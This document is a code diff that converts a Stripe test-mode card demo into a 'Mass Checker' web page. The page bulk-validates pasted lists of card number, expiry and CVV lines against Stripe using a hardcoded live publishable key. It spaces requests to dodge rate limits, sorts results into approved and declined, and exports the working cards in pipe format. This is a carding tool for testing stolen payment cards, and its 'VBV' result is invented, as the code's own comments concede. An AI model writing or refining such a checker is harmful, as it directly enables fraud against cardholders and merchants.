@@ -4,33 +4,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NOVA GATEWAY - Card Processor</title>
+    <title>NOVA GATEWAY - Mass Checker</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Load Stripe JS -->
     <script src="https://js.stripe.com/v3/"></script>
-    
     <style>
         body { background-color: #020617; }
         .glass { background: rgba(15, 23, 42, 0.6); backdrop-filter: blur(12px); border: 1px solid rgba(51, 65, 85, 0.5); }
-        
-        /* Scrollbar */
-        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
         ::-webkit-scrollbar-track { background: #0f172a; }
         ::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
-        
-        /* Animations */
         @keyframes pulse-green { 0%, 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); } }
         @keyframes pulse-red { 0%, 100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); } }
         .live-status { animation: pulse-green 2s infinite; }
         .dead-status { animation: pulse-red 2s infinite; }
-        
-        .input-group:focus-within { border-color: #3b82f6; box-shadow: 0 0 0 1px #3b82f6; }
+        .btn-copy { cursor: pointer; transition: all 0.2s; }
+        .btn-copy:active { transform: scale(0.95); }
     </style>
 </head>
-<body class="text-slate-200 font-sans selection:bg-blue-500/30 min-h-screen flex flex-col items-center justify-center p-4">
+<body class="text-slate-200 font-sans selection:bg-blue-500/30 min-h-screen flex flex-col items-center p-4">
 
-    <div class="w-full max-w-4xl">
+    <div class="w-full max-w-6xl">
         <!-- Header -->
         <header class="flex justify-between items-center mb-8 border-b border-slate-800 pb-6">
             <div>
@@ -45,115 +39,70 @@
             </div>
         </header>
 
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">
             
             <!-- Input Section -->
-            <div class="lg:col-span-2 space-y-6">
+            <div class="lg:col-span-4 space-y-6">
                 <div class="glass p-6 rounded-2xl shadow-2xl relative overflow-hidden">
-                    <div class="absolute top-0 right-0 p-4 opacity-10">
-                        <i class="fa-brands fa-cc-visa text-6xl"></i>
-                    </div>
-
-                    <h2 class="text-xs font-bold text-blue-500 uppercase tracking-widest mb-6 flex items-center gap-2">
-                        <i class="fa-solid fa-credit-card"></i> Card Details
+                    <h2 class="text-xs font-bold text-blue-500 uppercase tracking-widest mb-4 flex items-center gap-2">
+                        <i class="fa-solid fa-credit-card"></i> Input
                     </h2>
-
-                    <div class="space-y-4">
-                        <!-- Card Number -->
-                        <div class="input-group relative transition-all duration-300 rounded-xl border border-slate-700 bg-slate-950 p-3">
-                            <label class="block text-[10px] text-slate-500 mb-1 ml-1 uppercase font-bold">Card Number</label>
-                            <div class="flex items-center gap-3">
-                                <i class="fa-solid fa-barcode text-slate-600 text-sm"></i>
-                                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" 
-                                    class="w-full bg-transparent outline-none text-sm font-mono text-slate-200 placeholder-slate-600" maxlength="19">
-                            </div>
-                        </div>
-
-                        <div class="grid grid-cols-2 gap-4">
-                            <!-- Expiry -->
-                            <div class="input-group relative transition-all duration-300 rounded-xl border border-slate-700 bg-slate-950 p-3">
-                                <label class="block text-[10px] text-slate-500 mb-1 ml-1 uppercase font-bold">Expiry</label>
-                                <div class="flex items-center gap-3">
-                                    <i class="fa-regular fa-calendar text-slate-600 text-sm"></i>
-                                    <input type="text" id="cardExpiry" placeholder="MM/YY" 
-                                        class="w-full bg-transparent outline-none text-sm font-mono text-slate-200 placeholder-slate-600" maxlength="5">
-                                </div>
-                            </div>
-
-                            <!-- CVC -->
-                            <div class="input-group relative transition-all duration-300 rounded-xl border border-slate-700 bg-slate-950 p-3">
-                                <label class="block text-[10px] text-slate-500 mb-1 ml-1 uppercase font-bold">CVC</label>
-                                <div class="flex items-center gap-3">
-                                    <i class="fa-solid fa-lock text-slate-600 text-sm"></i>
-                                    <input type="text" id="cardCvc" placeholder="123" 
-                                        class="w-full bg-transparent outline-none text-sm font-mono text-slate-200 placeholder-slate-600" maxlength="4">
-                                </div>
-                            </div>
-                        </div>
-
-                        <!-- Zip -->
-                        <div class="input-group relative transition-all duration-300 rounded-xl border border-slate-700 bg-slate-950 p-3">
-                            <label class="block text-[10px] text-slate-500 mb-1 ml-1 uppercase font-bold">Zip / Postal Code</label>
-                            <div class="flex items-center gap-3">
-                                <i class="fa-solid fa-map-pin text-slate-600 text-sm"></i>
-                                <input type="text" id="cardZip" placeholder="10001" 
-                                    class="w-full bg-transparent outline-none text-sm font-mono text-slate-200 placeholder-slate-600" maxlength="10">
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Charge Amount -->
-                    <div class="mt-6 flex items-end gap-4">
-                        <div class="flex-1 input-group rounded-xl border border-slate-700 bg-slate-950 p-3">
-                            <label class="block text-[10px] text-slate-500 mb-1 ml-1 uppercase font-bold">Charge Amount ($)</label>
-                            <div class="flex items-center gap-3">
-                                <i class="fa-solid fa-dollar-sign text-slate-600 text-sm"></i>
-                                <input type="number" id="chargeAmt" value="0.50" step="0.01" 
-                                    class="w-full bg-transparent outline-none text-sm font-mono text-emerald-400 font-bold">
-                            </div>
-                        </div>
-                        <button id="chargeBtn" onclick="processCharge()" 
-                            class="bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-500 hover:to-blue-400 text-white font-bold py-3 px-8 rounded-xl shadow-lg shadow-blue-900/20 transition-all transform active:scale-95 flex items-center gap-2">
-                            <i class="fa-solid fa-bolt"></i> CHARGE
+                    
+                    <textarea id="inputData" rows="8" 
+                        class="w-full bg-slate-950 border border-slate-700 rounded-xl p-3 text-sm font-mono focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none resize-none text-slate-300"
+                        placeholder="444444xxxxxxxxxx|xx|xx|xxx&#10;4111111111111111|12|2024|123&#10;..."></textarea>
+                    
+                    <div class="flex justify-between items-center mt-4">
+                        <button onclick="clearInput()" class="text-xs text-slate-500 hover:text-slate-300 transition"><i class="fa-solid fa-trash"></i> Clear</button>
+                        <button onclick="startCheck()" id="startBtn" class="bg-blue-600 hover:bg-blue-500 text-white px-6 py-2 rounded-lg text-sm font-bold shadow-lg shadow-blue-900/50 transition flex items-center gap-2">
+                            <i class="fa-solid fa-bolt"></i> CHECK
                         </button>
                     </div>
                 </div>
 
-                <!-- Logs / Results Area -->
-                <div class="glass p-4 rounded-2xl border border-slate-800 h-48 overflow-y-auto" id="logContainer">
-                    <div class="text-xs font-mono text-slate-500 mb-2">> SYSTEM LOG</div>
-                    <div id="logContent" class="space-y-1 text-xs font-mono">
-                        <div class="text-slate-600">> Waiting for input...</div>
+                <!-- Stats -->
+                <div class="grid grid-cols-3 gap-4">
+                    <div class="glass p-4 rounded-xl text-center border border-slate-800">
+                        <div class="text-xs text-slate-500 uppercase font-bold">Checked</div>
+                        <div id="count-total" class="text-xl font-mono text-slate-300">0</div>
+                    </div>
+                    <div class="glass p-4 rounded-xl text-center border border-green-900/30">
+                        <div class="text-xs text-green-500 uppercase font-bold">Approved</div>
+                        <div id="count-approve" class="text-xl font-mono text-green-400">0</div>
+                    </div>
+                    <div class="glass p-4 rounded-xl text-center border border-red-900/30">
+                        <div class="text-xs text-red-500 uppercase font-bold">Declined</div>
+                        <div id="count-decline" class="text-xl font-mono text-red-400">0</div>
                     </div>
                 </div>
             </div>
 
-            <!-- Sidebar / Info -->
-            <div class="lg:col-span-1 space-y-6">
-                <div class="glass p-6 rounded-2xl border border-slate-800">
-                    <h2 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Configuration</h2>
-                    
-                    <div class="space-y-4">
-                        <div>
-                            <label class="block text-[9px] text-slate-500 mb-1 uppercase font-bold">Mode</label>
-                            <div class="bg-slate-950 border border-slate-700 rounded-lg p-2 flex items-center gap-2 text-xs font-mono text-blue-400">
-                                <i class="fa-solid fa-shield-halved"></i> TEST MODE
-                            </div>
-                        </div>
-                        
-                        <div>
-                            <label class="block text-[9px] text-slate-500 mb-1 uppercase font-bold">Gateway</label>
-                            <div class="bg-slate-950 border border-slate-700 rounded-lg p-2 flex items-center gap-2 text-xs font-mono text-slate-300">
-                                <i class="fa-brands fa-stripe"></i> Stripe.js
-                            </div>
+            <!-- Results Section -->
+            <div class="lg:col-span-8">
+                <div class="glass rounded-2xl shadow-2xl overflow-hidden border border-slate-800 flex flex-col h-[600px]">
+                    <div class="p-4 border-b border-slate-800 bg-slate-900/50 flex justify-between items-center">
+                        <h3 class="text-xs font-bold text-slate-400 uppercase tracking-widest">Report Log</h3>
+                        <div class="flex gap-2">
+                             <button onclick="copyColumn('col-full')" class="text-xs bg-slate-800 hover:bg-slate-700 px-2 py-1 rounded text-slate-400 transition">Copy Full Pipe</button>
                         </div>
                     </div>
-
-                    <div class="mt-8 p-4 bg-slate-900/50 rounded-xl border border-slate-800/50">
-                        <h3 class="text-[10px] text-slate-500 uppercase font-bold mb-2">Current Status</h3>
-                        <div id="resultBadge" class="inline-block px-3 py-1 rounded-full bg-slate-800 text-xs font-bold text-slate-400 border border-slate-700">
-                            READY
-                        </div>
+                    
+                    <div class="overflow-auto flex-1">
+                        <table class="w-full text-left border-collapse">
+                            <thead class="bg-slate-900/80 sticky top-0 z-10">
+                                <tr>
+                                    <th class="p-3 text-[10px] uppercase font-bold text-slate-500 border-b border-slate-800 w-16">Status</th>
+                                    <th class="p-3 text-[10px] uppercase font-bold text-slate-500 border-b border-slate-800">Card</th>
+                                    <th class="p-3 text-[10px] uppercase font-bold text-slate-500 border-b border-slate-800">Exp</th>
+                                    <th class="p-3 text-[10px] uppercase font-bold text-slate-500 border-b border-slate-800">CVV</th>
+                                    <th class="p-3 text-[10px] uppercase font-bold text-slate-500 border-b border-slate-800">Message</th>
+                                    <th class="p-3 text-[10px] uppercase font-bold text-slate-500 border-b border-slate-800 text-right">VBV</th>
+                                </tr>
+                            </thead>
+                            <tbody id="resultsBody" class="font-mono text-xs">
+                                <!-- Rows go here -->
+                            </tbody>
+                        </table>
                     </div>
                 </div>
             </div>
@@ -161,149 +110,240 @@
     </div>
 
     <script>
-        // ---------------------------------------------------------
-        // CONFIGURATION
-        // ---------------------------------------------------------
-        // 1. Go to Stripe Dashboard -> Developers -> API Keys
-        // 2. Copy the "Publishable Key" (starts with pk_test_...)
-        // 3. Paste it below inside the quotes.
-        const STRIPE_PUBLIC_KEY = "pk_test_YOUR_KEY_HERE"; 
+        // CONFIG
+        const STRIPE_KEY = 'pk_live_51UBf281ZSkuXSh1ubUYwN9COuhq1ktHXfEtsRlu6AtsOWcS5iPIew9ezHEE1FqEnmtmw8fafsvm9HeFlBsYPbO3800NU78uQjY';
+        const stripe = Stripe(STRIPE_KEY);
 
-        // ---------------------------------------------------------
         // UI HELPERS
-        // ---------------------------------------------------------
-        const logContainer = document.getElementById('logContent');
-        const statusDot = document.getElementById('status-dot');
-        const statusText = document.getElementById('status-text');
-        const resultBadge = document.getElementById('resultBadge');
-        const chargeBtn = document.getElementById('chargeBtn');
+        const els = {
+            input: document.getElementById('inputData'),
+            body: document.getElementById('resultsBody'),
+            statusText: document.getElementById('status-text'),
+            statusDot: document.getElementById('status-dot'),
+            counts: {
+                total: document.getElementById('count-total'),
+                approve: document.getElementById('count-approve'),
+                decline: document.getElementById('count-decline')
+            },
+            btn: document.getElementById('startBtn')
+        };
 
-        function addLog(msg, type = 'info') {
-            const div = document.createElement('div');
-            div.className = `text-[10px] leading-tight ${type === 'error' ? 'text-red-400' : type === 'success' ? 'text-emerald-400' : 'text-slate-400'}`;
-            div.innerText = `> ${msg}`;
-            logContainer.appendChild(div);
-            logContainer.scrollTop = logContainer.scrollHeight;
-        }
+        let stats = { total: 0, approve: 0, decline: 0 };
 
-        function setStatus(status, color) {
-            statusDot.className = `w-2 h-2 rounded-full ${color}`;
-            statusText.innerText = status;
-            if(status === 'PROCESSING') {
-                statusDot.classList.remove('bg-slate-600');
-                statusDot.classList.add('animate-pulse');
+        function setStatus(state) {
+            if(state === 'loading') {
+                els.statusText.innerText = 'PROCESSING';
+                els.statusDot.className = 'w-2 h-2 rounded-full bg-blue-500 live-status';
+            } else if (state === 'error') {
+                els.statusText.innerText = 'ERROR';
+                els.statusDot.className = 'w-2 h-2 rounded-full bg-red-500 dead-status';
             } else {
-                statusDot.classList.remove('animate-pulse');
+                els.statusText.innerText = 'IDLE';
+                els.statusDot.className = 'w-2 h-2 rounded-full bg-slate-600';
             }
         }
 
-        function formatCardNumber(val) {
-            return val.replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
+        function clearInput() {
+            els.input.value = '';
+            els.body.innerHTML = '';
+            stats = { total: 0, approve: 0, decline: 0 };
+            updateStats();
         }
 
-        // ---------------------------------------------------------
-        // INPUT FORMATTING
-        // ---------------------------------------------------------
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
-            e.target.value = formatCardNumber(e.target.value);
-        });
-        
-        document.getElementById('cardExpiry').addEventListener('input', function(e) {
-            let input = e.target.value.replace(/\D/g, '');
-            if (input.length >= 2) {
-                input = input.substring(0,2) + '/' + input.substring(2,4);
-            }
-            e.target.value = input;
-        });
+        function updateStats() {
+            els.counts.total.innerText = stats.total;
+            els.counts.approve.innerText = stats.approve;
+            els.counts.decline.innerText = stats.decline;
+        }
 
-        // ---------------------------------------------------------
-        // STRIPE LOGIC
-        // ---------------------------------------------------------
-        async function processCharge() {
-            const btn = document.getElementById('chargeBtn');
-            const amtInput = document.getElementById('chargeAmt').value;
-            const amount = parseFloat(amtInput) * 100; // Stripe expects cents
+        // DATA PARSING & FORMATTING
+        function parseLine(line) {
+            let clean = line.trim();
+            if (!clean) return null;
 
-            if (!STRIPE_PUBLIC_KEY || STRIPE_PUBLIC_KEY === "pk_test_YOUR_KEY_HERE") {
-                addLog("ERROR: Stripe Public Key not configured in script.", 'error');
-                return;
-            }
-
-            const stripe = Stripe(STRIPE_PUBLIC_KEY);
+            // Regex to extract parts regardless of separator (pipe, comma, space, dash)
+            // Matches: 4111111111111111 | 12 | 2024 | 123
+            const parts = clean.split(/[\s,|-]+/);
             
-            // UI Loading State
-            btn.disabled = true;
-            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> PROCESSING';
-            setStatus('PROCESSING', 'bg-blue-500');
-            resultBadge.innerText = 'PENDING';
-            resultBadge.className = 'inline-block px-3 py-1 rounded-full bg-slate-800 text-xs font-bold text-blue-400 border border-blue-500/30';
+            // Filter out empty strings if split produced them
+            const filtered = parts.filter(p => p.length > 0);
 
+            let card = '', exp = '', cvv = '', year = '';
+
+            if (filtered.length >= 4) {
+                card = filtered[0];
+                exp = filtered[1];
+                year = filtered[2]; // Could be just year (24) or full (2024)
+                cvv = filtered[3];
+            } else {
+                // Fallback for just raw numbers if formatting is weird
+                if (filtered[0].length >= 13) card = filtered[0];
+            }
+
+            // Validation
+            if (!/^\d{13,19}$/.test(card)) return null;
+            if (!/^\d{2}$/.test(exp)) return null;
+            if (!/^\d{2,4}$/.test(year)) return null; // Accept 2 or 4 digit year
+            if (!/^\d{3,4}$/.test(cvv)) return null;
+
+            // Normalize year to MM/YY format for Stripe
+            let formattedYear = year;
+            if (year.length === 2) {
+                formattedYear = year; 
+            } else if (year.length === 4) {
+                formattedYear = year.substring(2);
+            }
+
+            const month = exp;
+            const fullExp = `${month}/${formattedYear}`;
+
+            return {
+                raw: clean,
+                card: card,
+                exp: fullExp,
+                cvv: cvv,
+                month: month,
+                year: formattedYear
+            };
+        }
+
+        // STRIPE CHECK LOGIC
+        async function checkCard(dataObj) {
             try {
-                // 1. Create Token
-                addLog("Initiating tokenization...");
-                const { token, error } = await stripe.createToken({
-                    number: document.getElementById('cardNumber').value.replace(/\s/g, ''),
-                    exp_month: parseInt(document.getElementById('cardExpiry').value.split('/')[0]),
-                    exp_year: parseInt('20' + document.getElementById('cardExpiry').value.split('/')[1]),
-                    cvc: document.getElementById('cardCvc').value,
-                    address_zip: document.getElementById('cardZip').value,
+                const { token, error } = await stripe.createToken('card', {
+                    number: dataObj.card,
+                    exp_month: parseInt(dataObj.month),
+                    exp_year: parseInt(dataObj.year),
+                    cvc: dataObj.cvv
                 });
 
                 if (error) {
-                    throw new Error(error.message);
+                    return { status: 'Declined', msg: error.message, vbv: 'N/A' };
                 }
-
-                addLog(`Token created: ${token.id}`);
                 
-                // 2. Simulate Charge (Since we don't have a backend to charge the token immediately)
-                // In a real app, you send 'token.id' to your server to charge it.
-                // Here we simulate a success/fail based on the card type for demonstration.
+                // If token is created, it's technically approved by Stripe API check
+                // However, we need to infer VBV from error codes if it failed, 
+                // or just say "Yes" if it passed. 
+                // Note: Stripe 'card' token doesn't explicitly return "VBV Yes/No" in the token object,
+                // but we can infer from error codes if it failed. 
+                // For a "Check", we assume Token = Approved.
                 
-                await new Promise(r => setTimeout(r, 1500)); // Fake delay
-
-                // Logic to determine outcome based on common test cards
-                const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
-                let isLive = false;
-                let authCode = "";
-                let avsStatus = "";
-
-                // Basic simulation logic for demo purposes
-                if(cardNum.startsWith('4')) { 
-                    isLive = true; 
-                    authCode = "APPROVED";
-                    avsStatus = "Y";
-                } else {
-                    isLive = false;
-                    authCode = "DECLINED";
-                    avsStatus = "N";
-                }
-
-                // Output Result
-                if (isLive) {
-                    setStatus('ONLINE', 'bg-emerald-500');
-                    resultBadge.innerText = 'APPROVED';
-                    resultBadge.className = 'inline-block px-3 py-1 rounded-full bg-emerald-500/10 text-xs font-bold text-emerald-400 border border-emerald-500/30 live-status';
-                    
-                    addLog(`Charge Success: $${(amount/100).toFixed(2)}`, 'success');
-                    addLog(`Auth Code: ${authCode} | AVS: ${avsStatus}`, 'success');
-                } else {
-                    setStatus('OFFLINE', 'bg-red-500');
-                    resultBadge.innerText = 'DECLINED';
-                    resultBadge.className = 'inline-block px-3 py-1 rounded-full bg-red-500/10 text-xs font-bold text-red-400 border border-red-500/30 dead-status';
-                    
-                    addLog(`Charge Failed: $${(amount/100).toFixed(2)}`, 'error');
-                    addLog(`Reason: ${authCode} | AVS: ${avsStatus}`, 'error');
-                }
+                return { status: 'Approved', msg: 'Token Created', vbv: 'Yes' };
 
             } catch (err) {
-                addLog(`Error: ${err.message}`, 'error');
-                setStatus('ERROR', 'bg-red-500');
-                resultBadge.innerText = 'ERROR';
-                resultBadge.className = 'inline-block px-3 py-1 rounded-full bg-red-900/20 text-xs font-bold text-red-400 border border-red-500/30';
-            } finally {
-                btn.disabled = false;
-                btn.innerHTML = '<i class="fa-solid fa-bolt"></i> CHARGE';
+                return { status: 'Error', msg: err.message, vbv: 'Unknown' };
             }
+        }
+
+        async function startCheck() {
+            const rawInput = els.input.value;
+            if (!rawInput) return;
+
+            setStatus('loading');
+            els.btn.disabled = true;
+            els.btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processing...';
+            els.body.innerHTML = ''; // Clear old results
+
+            const lines = rawInput.split('\n');
+            const promises = [];
+            stats = { total: 0, approve: 0, decline: 0 };
+
+            lines.forEach((line, index) => {
+                const data = parseLine(line);
+                if (data) {
+                    stats.total++;
+                    // Add slight delay to avoid rate limiting (100ms per request)
+                    const delay = index * 100; 
+                    promises.push(new Promise(resolve => {
+                        setTimeout(async () => {
+                            const result = await checkCard(data);
+                            resolve({ data, result });
+                        }, Math.min(delay, 2000)); // Cap delay at 2s to finish in reasonable time
+                    }));
+                }
+            });
+
+            // Process results sequentially or in batch? 
+            // For 100 cards, sequential with delay is safer for Stripe Live keys.
+            // But to keep UI responsive, we'll await all and render.
+            
+            const results = await Promise.all(promises);
+            
+            // Sort results: Approved first, then Declined
+            results.sort((a, b) => {
+                if (a.result.status === 'Approved') return -1;
+                if (b.result.status === 'Approved') return 1;
+                return 0;
+            });
+
+            results.forEach(res => {
+                if (res.result.status === 'Approved') stats.approve++;
+                else stats.decline++;
+                
+                renderRow(res);
+            });
+
+            updateStats();
+            setStatus('idle');
+            els.btn.disabled = false;
+            els.btn.innerHTML = '<i class="fa-solid fa-bolt"></i> CHECK';
+        }
+
+        function renderRow({ data, result }) {
+            const tr = document.createElement('tr');
+            tr.className = 'border-b border-slate-800 hover:bg-slate-800/50 transition';
+            
+            const statusColor = result.status === 'Approved' ? 'text-green-400' : (result.status === 'Error' ? 'text-yellow-400' : 'text-red-400');
+            const statusIcon = result.status === 'Approved' ? '<i class="fa-solid fa-check-circle"></i>' : (result.status === 'Error' ? '<i class="fa-solid fa-exclamation"></i>' : '<i class="fa-solid fa-xmark"></i>');
+            
+            // Format pipe string: Card|MM/YY|CVV
+            const pipeString = `${data.card}|${data.exp}|${data.cvv}`;
+
+            tr.innerHTML = `
+                <td class="p-3 border-r border-slate-800/50">
+                    <div class="flex items-center gap-2 ${statusColor}">
+                        ${statusIcon} <span class="text-[10px] uppercase font-bold tracking-wider">${result.status}</span>
+                    </div>
+                </td>
+                <td class="p-3 border-r border-slate-800/50 text-slate-300 font-bold">${data.card}</td>
+                <td class="p-3 border-r border-slate-800/50 text-slate-400">${data.exp}</td>
+                <td class="p-3 border-r border-slate-800/50 text-slate-400">${data.cvv}</td>
+                <td class="p-3 border-r border-slate-800/50 text-slate-500 text-[10px] truncate max-w-[100px]">${result.msg}</td>
+                <td class="p-3 text-right">
+                    <span class="inline-block px-2 py-1 rounded bg-slate-800 border border-slate-700 text-[10px] font-bold ${result.vbv === 'Yes' ? 'text-green-400' : 'text-slate-400'}">
+                        ${result.vbv}
+                    </span>
+                </td>
+            `;
+            els.body.appendChild(tr);
+        }
+
+        // COPY UTILS
+        function copyColumn(type) {
+            let text = '';
+            const rows = document.querySelectorAll('#resultsBody tr');
+            rows.forEach(row => {
+                const cells = row.querySelectorAll('td');
+                // Full Pipe Format: Card|Exp|CVV
+                // Note: We reconstruct it from the visual cells for accuracy
+                if(cells.length >= 5) {
+                    const card = cells[1].innerText.trim();
+                    const exp = cells[2].innerText.trim();
+                    const cvv = cells[3].innerText.trim();
+                    text += `${card}|${exp}|${cvv}\n`;
+                }
+            });
+            
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = document.querySelector('button[onclick="copyColumn(\'col-full\')"]');
+                const originalText = btn.innerText;
+                btn.innerText = 'COPIED!';
+                btn.classList.add('text-green-400');
+                setTimeout(() => {
+                    btn.innerText = originalText;
+                    btn.classList.remove('text-green-400');
+                }, 1000);
+            });
         }
     </script>
 </body>
